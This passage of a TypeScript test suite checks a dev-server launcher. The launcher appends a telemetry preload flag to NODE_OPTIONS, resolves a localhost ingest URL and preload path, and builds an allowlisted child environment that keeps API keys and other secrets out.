  readonly parentEnv: ParentEnvironment;
}

/** Launchers created by a test, disposed in `afterEach` so no child outlives it. */
const launchers: DevServerLauncher[] = [];

function createHarness(options: HarnessOptions = {}): Harness {
  const projectRoot = options.projectRoot ?? makeProject();
  const preloadPath = makePreload();
  const spawner = new SpawnRecorder(options.children);
  const issuer = options.issuer ?? createIssuer();
  const { logger, records } = recordingLogger();
  const parentEnv = options.parentEnv ?? PARENT_ENV;
  const detect = vi.fn<DetectFn>(
    options.detect ??
      ((input) => Promise.resolve(detectionFor(input.projectRoot, preloadPath, options.detection))),
  );
  const probe = vi.fn<ProbeFn>(
    options.probe ??
      ((url) =>
        Promise.resolve(
          spawner.children.some((child) => child.listensAt(url))
            ? probeAnswer(url, true, 'next')
            : probeAnswer(url, false),
        )),
  );
  const ownership = vi.fn<OwnsListenerFn>(
    options.ownership ??
      ((rootPid, port) =>
        Promise.resolve(
          spawner.children.some((child) => child.pid === rootPid && child.holdsPort(port)),
        )),
  );
  const launcher = createDevServerLauncher({
    config: SERVICE_CONFIG,
    logger,
    credentials: issuer.credentials,
    parentEnv,
    spawnImpl: spawner.spawn,
    detect,
    probe,
    listenerOwnership: { ownsListener: ownership },
    preloadPath,
    platform: POSIX,
    now: () => FIXED_NOW,
    readyTimeoutMs: 5_000,
    readyPollIntervalMs: 100,
    stopGraceMs: 1_000,
    ...options.deps,
  });
  launchers.push(launcher);
  return {
    launcher,
    projectRoot,
    preloadPath,
    spawner,
    issuer,
    detect,
    probe,
    ownership,
    records,
    parentEnv,
  };
}

/**
 * The `index`-th child of a launch in flight — or a test failure naming the
 * result, when the launch settled without spawning it. The race resolves
 * either way, so no rejection is ever left unhandled.
 */
async function spawnedChild(
  harness: Harness,
  pending: Promise<Result<unknown, DebuggenError>>,
  index = 0,
): Promise<FakeChild> {
  const winner = await Promise.race([
    harness.spawner.child(index),
    pending.then((result) => ({ settledEarly: result })),
  ]);
  if (winner instanceof FakeChild) {
    return winner;
  }
  const detail = isErr(winner.settledEarly)
    ? `Err(${winner.settledEarly.error.code}): ${winner.settledEarly.error.message}`
    : 'Ok';
  throw new Error(`the launch settled before spawn #${String(index)}: ${detail}`);
}

/**
 * Launch the harness project, let the `index`-th child announce `origin` on
 * stdout, and return the managed launch.
 */
async function launchReady(
  harness: Harness,
  input: Partial<DevServerLaunchInput> = {},
  index = 0,
  origin = DEV_ORIGIN,
): Promise<{ readonly launch: ManagedDevServerLaunch; readonly child: FakeChild }> {
  const pending = harness.launcher.launch({ projectRoot: harness.projectRoot, ...input });
  const child = await spawnedChild(harness, pending, index);
  child.print(`   - Local:        ${origin}\n`);
  const launch = expectOk(await pending);
  if (!launch.managed) {
    throw new Error('expected a managed launch');
  }
  return { launch, child };
}

afterEach(async () => {
  vi.useRealTimers();
  const pending = launchers.splice(0);
  await Promise.all(pending.map((launcher) => launcher.dispose()));
  for (const directory of sandboxes.splice(0)) {
    rmSync(directory, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// appendNodeOptions — invariant 1: append, never replace
// ---------------------------------------------------------------------------

/** The preload flag every `NODE_OPTIONS` case appends. */
const PRELOAD_FLAG = buildPreloadImportFlag('/opt/toolchain/dist/telemetry/node/register.mjs');

/** The whitespace-separated words of an option string. */
function wordsOf(options: string): string[] {
  return options.split(/\s+/).filter((word) => word.length > 0);
}

describe('appendNodeOptions', () => {
  it.each([
    { label: 'undefined', existing: undefined },
    { label: 'the empty string', existing: '' },
    { label: 'whitespace only', existing: ' \t  ' },
  ])('yields exactly the flag for $label', ({ existing }) => {
    expect(appendNodeOptions(existing, PRELOAD_FLAG)).toBe(PRELOAD_FLAG);
  });

  it('preserves existing flags verbatim and in order, appending with exactly one space', () => {
    const existing = '--max-old-space-size=4096 --require ./tracing-shim.cjs';

    const combined = appendNodeOptions(existing, PRELOAD_FLAG);

    expect(combined).toBe(`${existing} ${PRELOAD_FLAG}`);
    expect(combined.startsWith(`${existing} `)).toBe(true);
    expect(combined.slice(existing.length)).toBe(` ${PRELOAD_FLAG}`);
  });

  it('keeps interior spacing untouched and trims only the ends before joining', () => {
    expect(appendNodeOptions('  --inspect   --trace-warnings  ', PRELOAD_FLAG)).toBe(
      `--inspect   --trace-warnings ${PRELOAD_FLAG}`,
    );
  });

  it.each([
    { label: 'at the end', existing: `--inspect ${PRELOAD_FLAG}` },
    { label: 'at the start', existing: `${PRELOAD_FLAG} --inspect` },
    { label: 'as the only option', existing: PRELOAD_FLAG },
    {
      label: 'spelled --import=<url>',
      existing: `--inspect ${PRELOAD_FLAG.replace('--import ', '--import=')}`,
    },
    {
      label: 'with its value double-quoted',
      existing: `--inspect --import "${PRELOAD_FLAG.slice('--import '.length)}"`,
    },
  ])('is idempotent when the identical flag is already present $label', ({ existing }) => {
    expect(appendNodeOptions(existing, PRELOAD_FLAG)).toBe(existing);
  });

  it('applied twice equals applied once', () => {
    const once = appendNodeOptions('--enable-source-maps', PRELOAD_FLAG);

    expect(appendNodeOptions(once, PRELOAD_FLAG)).toBe(once);
    expect(wordsOf(once).filter((word) => word === '--import')).toHaveLength(1);
  });

  it('keeps an --import of a different module and appends its own after it', () => {
    const existing = '--import file:///opt/hooks/esm-loader.mjs';

    expect(appendNodeOptions(existing, PRELOAD_FLAG)).toBe(`${existing} ${PRELOAD_FLAG}`);
  });

  it('treats a merely similar module URL as a different module', () => {
    const similar = `${PRELOAD_FLAG}.bak`;

    expect(appendNodeOptions(similar, PRELOAD_FLAG)).toBe(`${similar} ${PRELOAD_FLAG}`);
  });

  it('returns the inherited value unchanged for an empty flag', () => {
    expect(appendNodeOptions('--inspect', '   ')).toBe('--inspect');
  });

  // Regression guard. Clobbering a developer's NODE_OPTIONS is the regression
  // this contract exists to prevent: it silently drops their heap limit, their
  // inspector or their own loader hook, and the breakage looks like a bug in
  // their application rather than in this tool. `scripts/dev-instrumented.mjs`
  // and `./detect.ts`'s relaunch command mirror the same append rule, so the
  // property is pinned over a table rather than one example: whatever the
  // input, every one of its words survives, in order, ahead of the flag.
  it.each([
    '--max-old-space-size=4096',
    '--require ./tracing-shim.cjs --enable-source-maps',
    '--import file:///opt/hooks/esm-loader.mjs --no-warnings',
    '--inspect=127.0.0.1:9229 --conditions=development',
    '--title "local console"',
  ])('never drops a word of %j', (existing) => {
    const inputWords = wordsOf(existing);
    const outputWords = wordsOf(appendNodeOptions(existing, PRELOAD_FLAG));

    expect(outputWords.slice(0, inputWords.length)).toEqual(inputWords);
    expect(outputWords.slice(inputWords.length)).toEqual(wordsOf(PRELOAD_FLAG));
  });
});

// ---------------------------------------------------------------------------
// buildPreloadImportFlag
// ---------------------------------------------------------------------------

describe('buildPreloadImportFlag', () => {
  it('produces --import followed by a file: URL, never a bare path', () => {
    const preloadPath = '/opt/toolchain/dist/telemetry/node/register.mjs';

    const flag = buildPreloadImportFlag(preloadPath);

    expect(flag).toBe(`--import ${pathToFileURL(preloadPath).href}`);
    const [option, specifier, ...rest] = flag.split(' ');
    expect(option).toBe('--import');
    expect(rest).toEqual([]);
    expect(specifier?.startsWith('file:///')).toBe(true);
    expect(specifier).not.toBe(preloadPath);
  });

  it('percent-encodes a space, so the flag stays one whitespace-free word after --import', () => {
    const flag = buildPreloadImportFlag('/opt/debug gen/register.mjs');

    expect(flag).toBe('--import file:///opt/debug%20gen/register.mjs');
    expect(wordsOf(flag)).toHaveLength(2);
  });

  it('round-trips a path with URL-significant characters back to the same file', () => {
    const preloadPath = '/opt/tool #2/v?1/register.mjs';

    const specifier = buildPreloadImportFlag(preloadPath).slice('--import '.length);

    expect(specifier).not.toMatch(/[\s#?]/);
    expect(fileURLToPath(specifier)).toBe(preloadPath);
  });

  it.each([
    { label: 'a relative path', preloadPath: 'dist/node/register.mjs' },
    { label: 'a dot-relative path', preloadPath: './register.mjs' },
    { label: 'the empty string', preloadPath: '' },
  ])('refuses $label as CONFIG_INVALID', ({ preloadPath }) => {
    const error = thrownBy(() => buildPreloadImportFlag(preloadPath));

    expect(error.code).toBe('CONFIG_INVALID');
    expect(reasonOf(error)).toBe('preload-path-not-absolute');
  });
});

// ---------------------------------------------------------------------------
// resolveIngestUrl
// ---------------------------------------------------------------------------

/**
 * The ingest path, from the protocol's route table. Composing the expected
 * endpoint from `buildPath` — never from a hand-written literal — is what makes
 * this suite fail if the launcher hardcodes a path or the protocol re-paths
 * the route.
 */
const INGEST_PATH = buildPath('telemetry.event');

describe('resolveIngestUrl', () => {
  // Why a full endpoint and not a base URL: the preload posts every batch to
  // DEBUGGEN_INGEST_URL verbatim, AND `packages/telemetry/src/node/config.ts`
  // derives the `server-agent` WebSocket control URL from this URL's origin —
  // no variable carries the control URL. A bare base URL would 404 every
  // batch, and a relative or wrong-origin one would silently leave the preload
  // unable to be armed or disabled.
  it('is the absolute ingest endpoint at the service origin', () => {
    const ingestUrl = resolveIngestUrl({ host: '127.0.0.1', port: 43117 });
    const parsed = new URL(ingestUrl);

    expect(ingestUrl).toBe(`http://127.0.0.1:43117${INGEST_PATH}`);
    expect(parsed.origin).toBe('http://127.0.0.1:43117');
    expect(parsed.pathname).toBe(INGEST_PATH);
    expect(parsed.href).toBe(ingestUrl);
    expect(parsed.search).toBe('');
    expect(parsed.hash).toBe('');
  });

  it('never joins with a double slash', () => {
    const endpoints = [
      resolveIngestUrl(SERVICE_CONFIG),
      resolveIngestUrl({ baseUrl: 'http://127.0.0.1:43117/' }),
      resolveIngestUrl({ baseUrl: 'http://127.0.0.1:43117///' }),
    ];

    for (const endpoint of endpoints) {
      expect(endpoint.slice('http://'.length)).not.toContain('//');
      expect(endpoint).toBe(`http://127.0.0.1:43117${INGEST_PATH}`);
    }
  });

  it.each([
    { label: 'a bare IPv6 host', host: '::1' },
    { label: 'an already bracketed IPv6 host', host: '[::1]' },
  ])('brackets $label', ({ host }) => {
    const ingestUrl = resolveIngestUrl({ host, port: 43117 });

    expect(ingestUrl).toBe(`http://[::1]:43117${INGEST_PATH}`);
    expect(new URL(ingestUrl).hostname).toBe('[::1]');
  });

  it('accepts localhost as the host', () => {
    expect(resolveIngestUrl({ host: 'localhost', port: 20_030 })).toBe(
      `http://localhost:20030${INGEST_PATH}`,
    );
  });

  it('keeps a base URL path prefix and drops its query and fragment', () => {
    expect(resolveIngestUrl({ baseUrl: 'http://127.0.0.1:43117/service/?probe=1#top' })).toBe(
      `http://127.0.0.1:43117/service${INGEST_PATH}`,
    );
  });

  it.each([
    {
      label: 'the ephemeral port 0',
      input: { host: '127.0.0.1', port: 0 },
      reason: 'port-not-bound',
    },
    {
      label: 'a port above 65535',
      input: { host: '127.0.0.1', port: 70_000 },
      reason: 'port-not-bound',
    },
    {
      label: 'a fractional port',
      input: { host: '127.0.0.1', port: 4.5 },
      reason: 'port-not-bound',
    },
    { label: 'an empty host', input: { host: '  ', port: 43117 }, reason: 'invalid-host' },
    {
      label: 'a host with a path',
      input: { host: '127.0.0.1/x', port: 43117 },
      reason: 'invalid-host',
    },
    { label: 'a relative base URL', input: { baseUrl: '/telemetry' }, reason: 'invalid-base-url' },
    {
      label: 'a non-http base URL',
      input: { baseUrl: 'ftp://127.0.0.1:43117/' },
      reason: 'invalid-base-url',
    },
  ])('refuses $label as CONFIG_INVALID', ({ input, reason }) => {
    const error = thrownBy(() => resolveIngestUrl(input));

    expect(error.code).toBe('CONFIG_INVALID');
    expect(reasonOf(error)).toBe(reason);
  });

  it('refuses a base URL that embeds credentials without echoing it', () => {
    const baseUrl = urlWithUserInfo('127.0.0.1:43117');

    const error = thrownBy(() => resolveIngestUrl({ baseUrl }));

    expect(error.code).toBe('CONFIG_INVALID');
    expect(reasonOf(error)).toBe('invalid-base-url');
    expect(errorSurfaces(error)).not.toContain(new URL(baseUrl).password);
    expect(errorSurfaces(error)).not.toContain(baseUrl);
  });
});

// ---------------------------------------------------------------------------
// resolvePreloadPath and its candidates
// ---------------------------------------------------------------------------

/** A non-existent toolchain root: candidate resolution is pure over these paths. */
const TOOLCHAIN = '/opt/toolchain';

/** The service bundle's URL in the VSIX layout, `dist/service/main.js`. */
const BUNDLED_SERVICE_URL = pathToFileURL(
  join(TOOLCHAIN, 'vsix', 'dist', 'service', 'main.js'),
).href;

/** Where the VSIX sibling layout puts the preload: `dist/telemetry/node/register.mjs`. */
const BUNDLED_PRELOAD = join(TOOLCHAIN, 'vsix', 'dist', 'telemetry', 'node', 'register.mjs');

/** An explicit override, as `../main.ts` or a test passes one. */
const EXPLICIT_PRELOAD = join(TOOLCHAIN, 'explicit', 'register.mjs');

/** What the workspace package resolution answers. */
const PACKAGE_PRELOAD = join(
  TOOLCHAIN,
  'node_modules',
  '@debuggen',
  'telemetry',
  'dist',
  'node',
  'register.mjs',
);

describe('preloadPathCandidates', () => {
  it('orders explicit, then the VSIX sibling, then package resolution, then workspace ancestors', () => {
    const resolvePackage = vi.fn<(specifier: string) => string | undefined>(() => PACKAGE_PRELOAD);

    const candidates = preloadPathCandidates({
      preloadPath: EXPLICIT_PRELOAD,
      moduleUrl: BUNDLED_SERVICE_URL,
      resolvePackage,
    });

    expect(candidates.slice(0, 3)).toEqual([
      { source: 'explicit', path: EXPLICIT_PRELOAD },
      { source: 'bundled', path: BUNDLED_PRELOAD },
      { source: 'package', path: PACKAGE_PRELOAD },
    ]);
    const workspace = candidates.slice(3);
    expect(workspace.length).toBeGreaterThan(0);
    expect(workspace.every((candidate) => candidate.source === 'workspace')).toBe(true);
    expect(workspace[0]?.path).toBe(
      join(TOOLCHAIN, 'vsix', 'dist', 'service', ...PRELOAD_WORKSPACE_RELATIVE_PATH.split('/')),
    );
    expect(workspace.map((candidate) => candidate.path)).toContain(
      join(TOOLCHAIN, ...PRELOAD_WORKSPACE_RELATIVE_PATH.split('/')),
    );
    expect(resolvePackage).toHaveBeenCalledWith(PRELOAD_PACKAGE_SPECIFIER);
    expect(PRELOAD_PACKAGE_SPECIFIER).toBe('@debuggen/telemetry/node/register');
  });

  it('derives the bundled candidate from the documented relative URL', () => {
    expect(fileURLToPath(new URL(PRELOAD_BUNDLED_RELATIVE_URL, BUNDLED_SERVICE_URL))).toBe(
      BUNDLED_PRELOAD,
    );
  });

  it('ignores a relative override rather than resolving it against an arbitrary directory', () => {
    const candidates = preloadPathCandidates({
      preloadPath: 'register.mjs',
      moduleUrl: BUNDLED_SERVICE_URL,
      resolvePackage: () => undefined,
    });

    expect(candidates.map((candidate) => candidate.source)).not.toContain('explicit');
    expect(candidates[0]).toEqual({ source: 'bundled', path: BUNDLED_PRELOAD });
  });
});

describe('resolvePreloadPath', () => {
  /** An existence check that confirms exactly `present`, recording every path it is asked about. */
  function existing(...present: string[]): Mock<(path: string) => boolean> {
    const set = new Set(present);
    return vi.fn<(path: string) => boolean>((path) => set.has(path));
  }

  const options = { moduleUrl: BUNDLED_SERVICE_URL, resolvePackage: () => PACKAGE_PRELOAD };

  it('prefers the explicit override and stops looking at the first hit', () => {
    const fileExists = existing(EXPLICIT_PRELOAD, BUNDLED_PRELOAD, PACKAGE_PRELOAD);

    const resolved = resolvePreloadPath({ ...options, preloadPath: EXPLICIT_PRELOAD, fileExists });

    expect(expectOk(resolved)).toBe(EXPLICIT_PRELOAD);
    expect(fileExists.mock.calls).toEqual([[EXPLICIT_PRELOAD]]);
  });

  it('falls through to the VSIX sibling layout when the override is missing', () => {
    const fileExists = existing(BUNDLED_PRELOAD, PACKAGE_PRELOAD);

    const resolved = resolvePreloadPath({ ...options, preloadPath: EXPLICIT_PRELOAD, fileExists });

    expect(expectOk(resolved)).toBe(BUNDLED_PRELOAD);
    expect(fileExists.mock.calls).toEqual([[EXPLICIT_PRELOAD], [BUNDLED_PRELOAD]]);
  });

  it('falls through to workspace package resolution when neither is present', () => {
    const fileExists = existing(PACKAGE_PRELOAD);

    const resolved = resolvePreloadPath({ ...options, preloadPath: EXPLICIT_PRELOAD, fileExists });

    expect(expectOk(resolved)).toBe(PACKAGE_PRELOAD);
    expect(fileExists.mock.calls).toEqual([
      [EXPLICIT_PRELOAD],
      [BUNDLED_PRELOAD],
      [PACKAGE_PRELOAD],
    ]);
  });

  it('treats an existence check that throws as a miss', () => {
    const fileExists = vi.fn<(path: string) => boolean>((path) => {
      if (path === EXPLICIT_PRELOAD) {
        throw Object.assign(new Error('stat EACCES'), { code: 'EACCES' });
      }
      return path === BUNDLED_PRELOAD;
    });

    expect(
      expectOk(resolvePreloadPath({ ...options, preloadPath: EXPLICIT_PRELOAD, fileExists })),
    ).toBe(BUNDLED_PRELOAD);
  });

  it('reports every candidate tried and the build step when none exists, creating nothing', () => {
    const sandbox = makeSandbox('no-preload');
    const moduleUrl = pathToFileURL(join(sandbox, 'dist', 'service', 'main.js')).href;
    const fileExists = existing();
    const lookup = { moduleUrl, resolvePackage: () => undefined, fileExists };
    const candidates = preloadPathCandidates(lookup);

    const error = expectErr(
      resolvePreloadPath(lookup),
      'INSTRUMENTATION_UNAVAILABLE',
      'preload-not-found',
    );

    expect(PRELOAD_BUILD_COMMAND).toBe('pnpm --filter @debuggen/telemetry build');
    expect(error.hint).toContain(PRELOAD_BUILD_COMMAND);
    const tried = candidates.map((candidate) => `${candidate.source}: ${candidate.path}`);
    expect(tried.length).toBeGreaterThan(1);
    for (const entry of tried) {
      expect(error.hint).toContain(entry);
    }
    expect(error.details?.['candidates']).toEqual(tried);
    expect(error.details?.['unavailableSignals']).toEqual(
      expect.arrayContaining([expect.any(String)]),
    );
    expect(fileExists).toHaveBeenCalledTimes(candidates.length);
    // Reported, never fabricated: no file, no directory appears as a fallback.
    expect(readdirSync(sandbox)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// buildDevServerEnv — the four injected variables (the named requirement)
// ---------------------------------------------------------------------------

/** The names whose values differ between two environments, `undefined` counting as absent. */
function changedKeys(before: ParentEnvironment, after: Readonly<Record<string, string>>): string[] {
  const names = new Set([...Object.keys(before), ...Object.keys(after)]);
  return [...names].filter((name) => before[name] !== after[name]).sort();
}

describe('buildDevServerEnv', () => {
  const projectRoot = '/home/dev/atlas-console';
  const preloadPath = '/opt/toolchain/dist/telemetry/node/register.mjs';
  const ingestUrl = resolveIngestUrl(SERVICE_CONFIG);

  /** A complete input over the representative parent environment. */
  function envInput(overrides: Partial<Parameters<typeof buildDevServerEnv>[0]> = {}) {
    return {
      parentEnv: PARENT_ENV,
      projectRoot,
      ingestUrl,
      token: fixtureCredential(1),
      preloadPath,
      platform: POSIX,
      ...overrides,
    };
  }

  it('is exactly the allowlisted service variables, the explicit assignments and the four PRELOAD_ENV_KEYS', () => {
    const launchEnv = { NEXT_PUBLIC_FEATURE_FLAG: '1', CHOKIDAR_USEPOLLING: 'true' };

    const env = buildDevServerEnv(envInput({ parentEnv: SERVICE_ENV, launchEnv }));

    expect(INJECTED_KEYS).toHaveLength(4);
    expect([...INJECTED_KEYS].sort()).toEqual([
      'DEBUGGEN_INGEST_URL',
      'DEBUGGEN_PROJECT_ROOT',
      'DEBUGGEN_TOKEN',
      'NODE_OPTIONS',
    ]);
    const allowlisted = Object.entries(SERVICE_ENV).filter(
      ([name, value]) => typeof value === 'string' && isForwardedToDevServer(name, POSIX),
    );
    expect(Object.keys(env).sort()).toEqual(
      [...allowlisted.map(([name]) => name), ...Object.keys(launchEnv), ...INJECTED_KEYS].sort(),
    );
    for (const [name, value] of allowlisted) {
      expect(env[name]).toBe(value);
    }
    expect(env['NEXT_PUBLIC_FEATURE_FLAG']).toBe('1');
    expect(env['CHOKIDAR_USEPOLLING']).toBe('true');
  });

  it('drops the provider key, service-only DEBUGGEN_* settings, editor variables and every unlisted credential', () => {
    const env = buildDevServerEnv(envInput({ parentEnv: SERVICE_ENV }));

    for (const name of SERVICE_ONLY_NAMES) {
      expect(SERVICE_ENV[name]).toBeDefined();
      expect(Object.keys(env)).not.toContain(name);
    }
    const serialized = JSON.stringify(env);
    for (const kind of ['provider', 'cloud', 'scm']) {
      expect(serialized).not.toContain(fixtureSecret(kind));
    }
  });

  it('forwards what the target app needs, including the database and port the e2e suites rely on', () => {
    const env = buildDevServerEnv(envInput({ parentEnv: SERVICE_ENV }));

    for (const name of FORWARDED_NAMES) {
      expect(env[name]).toBe(SERVICE_ENV[name]);
    }
  });

  it('appends the --import file: URL to the inherited NODE_OPTIONS instead of replacing it', () => {
    const env = buildDevServerEnv(envInput());
    const inherited = PARENT_ENV['NODE_OPTIONS'] ?? '';

    expect(env[PRELOAD_ENV_KEYS.nodeOptions]).toBe(
      `${inherited} ${buildPreloadImportFlag(preloadPath)}`,
    );
    expect(env[PRELOAD_ENV_KEYS.nodeOptions]).toBe(
      appendNodeOptions(inherited, buildPreloadImportFlag(preloadPath)),
    );
    expect(env[PRELOAD_ENV_KEYS.nodeOptions]).toContain(
      `--import ${pathToFileURL(preloadPath).href}`,
    );
  });

  it('sets NODE_OPTIONS to just the flag when the parent has none', () => {
    const env = buildDevServerEnv(envInput({ parentEnv: { PATH: '/usr/bin' } }));

    expect(env[PRELOAD_ENV_KEYS.nodeOptions]).toBe(buildPreloadImportFlag(preloadPath));
  });

  it('assigns the ingest endpoint, the project root exactly as supplied, and the token verbatim', () => {
    const token = fixtureCredential(7);

    const env = buildDevServerEnv(envInput({ token }));

    expect(env[PRELOAD_ENV_KEYS.ingestUrl]).toBe(`http://127.0.0.1:43117${INGEST_PATH}`);
    expect(env[PRELOAD_ENV_KEYS.projectRoot]).toBe(projectRoot);
    expect(env[PRELOAD_ENV_KEYS.token]).toBe(token);
  });

  it('passes allowlisted parent variables through untouched and drops undefined ones', () => {
    const env = buildDevServerEnv(envInput());

    expect(env['PATH']).toBe(PARENT_ENV['PATH']);
    expect(env['HOME']).toBe(PARENT_ENV['HOME']);
    expect(env['LANG']).toBe(PARENT_ENV['LANG']);
    expect(env['NODE_ENV']).toBe('development');
    expect(env['NEXT_OTEL_VERBOSE']).toBe('1');
    expect(Object.keys(env)).not.toContain('UNSET_BY_SHELL');
    expect(Object.values(env).every((value) => typeof value === 'string')).toBe(true);
  });

  it('forwards an allowlisted explicit assignment, replacing the inherited value', () => {
    const assignedDatabase = 'postgresql://127.0.0.1:5432/atlas_console_assigned';
    const env = buildDevServerEnv(
      envInput({
        parentEnv: SERVICE_ENV,
        launchEnv: {
          NEXT_PUBLIC_FEATURE_FLAG: '1',
          PORT: '4174',
          DATABASE_URL: assignedDatabase,
        },
      }),
    );

    expect(env['NEXT_PUBLIC_FEATURE_FLAG']).toBe('1');
    // The developer's explicit assignment replaces the service's own value.
    expect(SERVICE_ENV['PORT']).toBe('4173');
    expect(env['PORT']).toBe('4174');
    expect(env['DATABASE_URL']).toBe(assignedDatabase);
  });

  it('lets an assigned NODE_OPTIONS replace the inherited one and still appends the preload', () => {
    const env = buildDevServerEnv(
      envInput({ launchEnv: { [PRELOAD_ENV_KEYS.nodeOptions]: '--trace-warnings' } }),
    );

    expect(env[PRELOAD_ENV_KEYS.nodeOptions]).toBe(
      `--trace-warnings ${buildPreloadImportFlag(preloadPath)}`,
    );
  });

  it.each([
    { label: 'the credential', key: PRELOAD_ENV_KEYS.token, value: fixtureCredential(98) },
    {
      label: 'the ingest endpoint',
      key: PRELOAD_ENV_KEYS.ingestUrl,
      value: 'http://127.0.0.1:1/elsewhere',
    },
    { label: 'the project root', key: PRELOAD_ENV_KEYS.projectRoot, value: '/somewhere/else' },
  ])(
    'refuses a launch environment assigning the $label wiring key, so a stale value never reaches the child',
    ({ key, value }) => {
      const error = thrownBy(() => buildDevServerEnv(envInput({ launchEnv: { [key]: value } })));

      expect(error.code).toBe('CONFIG_INVALID');
      expect(reasonOf(error)).toBe('launch-env-not-allowed');
      expect(errorSurfaces(error)).not.toContain(value);
      expect(errorSurfaces(error)).not.toContain(key);
    },
  );

  it('never mutates the parent environment or the launch assignments', () => {
    const parentEnv: Record<string, string | undefined> = { ...SERVICE_ENV };
    const launchEnv: Record<string, string> = {
      NEXT_PUBLIC_FEATURE_FLAG: '1',
      NODE_OPTIONS: '--trace-warnings',
    };
    const before = structuredClone({ parentEnv, launchEnv });

    buildDevServerEnv(envInput({ parentEnv, launchEnv }));
    buildDevServerEnv(
      envInput({
        parentEnv: Object.freeze({ ...SERVICE_ENV }),
        launchEnv: Object.freeze({ ...launchEnv }),
      }),
    );

    expect({ parentEnv, launchEnv }).toStrictEqual(before);
  });

  it('overwrites a stale inherited DEBUGGEN_* credential rather than forwarding it', () => {
    const stale = fixtureCredential(99);
    const parentEnv = {
      ...PARENT_ENV,
      DEBUGGEN_TOKEN: stale,
      DEBUGGEN_INGEST_URL: 'http://127.0.0.1:1/elsewhere',
      DEBUGGEN_PROJECT_ROOT: '/somewhere/else',
    };

    const env = buildDevServerEnv(envInput({ parentEnv }));

    expect(env[PRELOAD_ENV_KEYS.token]).toBe(fixtureCredential(1));
    expect(env[PRELOAD_ENV_KEYS.ingestUrl]).toBe(ingestUrl);
    expect(env[PRELOAD_ENV_KEYS.projectRoot]).toBe(projectRoot);
    expect(JSON.stringify(env)).not.toContain(stale);
  });

  it('folds a differently cased Node_Options into NODE_OPTIONS on Windows', () => {
    const env = buildDevServerEnv(
      envInput({
        parentEnv: { Path: 'C:\\Windows', Node_Options: '--inspect' },
        platform: 'win32',
      }),
    );

    expect(env['NODE_OPTIONS']).toBe(`--inspect ${buildPreloadImportFlag(preloadPath)}`);
    expect(Object.keys(env)).not.toContain('Node_Options');
    expect(env['Path']).toBe('C:\\Windows');
  });

  it('matches the allowlist case-insensitively on Windows, keeping each spelling', () => {
    const env = buildDevServerEnv(
      envInput({
        parentEnv: {
          Path: 'C:\\Windows\\System32',
          SystemRoot: 'C:\\Windows',
          ComSpec: 'C:\\Windows\\System32\\cmd.exe',
          'ProgramFiles(x86)': 'C:\\Program Files (x86)',
          http_proxy: 'http://127.0.0.1:3128',
          Node_Options: '--inspect',
          Anthropic_Api_Key: fixtureSecret('provider'),
          DebugGen_Home: 'C:\\Users\\dev\\.debuggen',
          Debuggen_Log_Level: 'debug',
        },
        platform: 'win32',
      }),
    );

    expect(env['Path']).toBe('C:\\Windows\\System32');
    expect(env['SystemRoot']).toBe('C:\\Windows');
    expect(env['ComSpec']).toBe('C:\\Windows\\System32\\cmd.exe');
    expect(env['ProgramFiles(x86)']).toBe('C:\\Program Files (x86)');
    expect(env['http_proxy']).toBe('http://127.0.0.1:3128');
    expect(env['Debuggen_Log_Level']).toBe('debug');
    expect(env['NODE_OPTIONS']).toBe(`--inspect ${buildPreloadImportFlag(preloadPath)}`);
    expect(Object.keys(env)).not.toContain('Node_Options');
    expect(Object.keys(env)).not.toContain('Anthropic_Api_Key');
    expect(Object.keys(env)).not.toContain('DebugGen_Home');
    expect(JSON.stringify(env)).not.toContain(fixtureSecret('provider'));
  });

  it('replaces an inherited Windows variable with a differently cased assignment instead of duplicating it', () => {
    const env = buildDevServerEnv(
      envInput({
        parentEnv: { Path: 'C:\\Windows', Port: '4173', Node_Options: '--inspect' },
        launchEnv: { PORT: '4174', node_options: '--trace-warnings' },
        platform: 'win32',
      }),
    );

    const portKeys = Object.keys(env).filter((name) => name.toUpperCase() === 'PORT');
    expect(portKeys).toEqual(['PORT']);
    expect(env['PORT']).toBe('4174');
    expect(env['Path']).toBe('C:\\Windows');
    expect(env['NODE_OPTIONS']).toBe(`--trace-warnings ${buildPreloadImportFlag(preloadPath)}`);
    expect(Object.keys(env).filter((name) => name.toUpperCase() === 'NODE_OPTIONS')).toEqual([
      'NODE_OPTIONS',
    ]);
  });

  it.each([
    { label: 'a relative project root', projectRoot: 'atlas-console' },
    { label: 'a dot-relative project root', projectRoot: './atlas-console' },
    { label: 'an empty project root', projectRoot: '' },
  ])('throws PROJECT_NOT_FOUND for $label', ({ projectRoot: relative }) => {
    const error = thrownBy(() => buildDevServerEnv(envInput({ projectRoot: relative })));

    expect(error.code).toBe('PROJECT_NOT_FOUND');
    expect(reasonOf(error)).toBe('project-root-not-absolute');
  });

  it.each([
    { label: 'an empty credential', overrides: { token: '  ' }, reason: 'credential-missing' },
    {
      label: 'a relative ingest URL',
      overrides: { ingestUrl: INGEST_PATH },
      reason: 'ingest-url-invalid',
    },
    {
      label: 'a relative preload path',
      overrides: { preloadPath: 'register.mjs' },
      reason: 'preload-path-not-absolute',
    },
  ])('throws CONFIG_INVALID for $label, echoing no credential', ({ overrides, reason }) => {
    const error = thrownBy(() => buildDevServerEnv(envInput(overrides)));

    expect(error.code).toBe('CONFIG_INVALID');
    expect(reasonOf(error)).toBe(reason);
    expect(errorSurfaces(error)).not.toContain(fixtureCredential(1));
  });

  // Invariant 2: the credential is a capability. Only DEBUGGEN_TOKEN carries it.
  it('places the token in DEBUGGEN_TOKEN and in no other variable or name', () => {
    const token = fixtureCredential(3);

    const env = buildDevServerEnv(envInput({ token }));

    const carriers = Object.entries(env).filter(
      ([name, value]) => value.includes(token) || name.includes(token),
    );
    expect(carriers).toEqual([[PRELOAD_ENV_KEYS.token, token]]);
    expect(env[PRELOAD_ENV_KEYS.nodeOptions]).not.toContain(token);
  });
});

describe('isForwardedToDevServer and DEV_SERVER_ENV_ALLOWLIST', () => {
  it.each([
    { name: 'PATH', platform: POSIX, expected: true },
    { name: 'HOME', platform: POSIX, expected: true },
    { name: 'LC_ALL', platform: POSIX, expected: true },
    { name: 'XDG_CONFIG_HOME', platform: POSIX, expected: true },
    { name: 'NODE_EXTRA_CA_CERTS', platform: POSIX, expected: true },
    { name: 'https_proxy', platform: POSIX, expected: true },
    { name: 'COREPACK_HOME', platform: POSIX, expected: true },
    { name: 'NVM_DIR', platform: POSIX, expected: true },
    { name: 'FORCE_COLOR', platform: POSIX, expected: true },
    { name: 'NEXT_PUBLIC_API_BASE', platform: POSIX, expected: true },
    { name: 'NEXT_TELEMETRY_DISABLED', platform: POSIX, expected: true },
